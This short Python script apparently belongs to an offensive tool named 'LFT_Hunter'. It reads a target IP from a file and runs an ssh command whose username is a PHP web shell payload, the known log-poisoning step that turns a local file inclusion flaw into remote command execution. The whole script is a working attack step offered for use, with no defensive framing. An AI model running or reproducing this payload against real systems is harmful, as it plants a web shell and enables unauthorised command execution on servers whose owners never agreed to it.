#!/usr/bin/env python3
import os
with open (str(os.getcwd())+'/Package/Banner','r') as read:
     print(read.read())
with open('./Package/shell/.address','r') as SSHIP:
         SSHIPH = SSHIP.read().replace('\n','')     
info = ''
info +='='*20+'\n'
info +='[+]  _* SSH *_ \n'
info +='='*30+'\n'
info +='[!] IP   : .............| : '+ SSHIPH+'\n'
info +='[+] Port : .............| : 22\n'
info +='='*40+'\n'
print(info)
line = '┌──(SSH-[~/LFT_Hunter]\n'
line +='└─$ \n'
print(line)
line1 ="ssh '<?php system($_GET['cmd']);?>'@"+SSHIPH.replace('\n','')
command = os.system(line1)
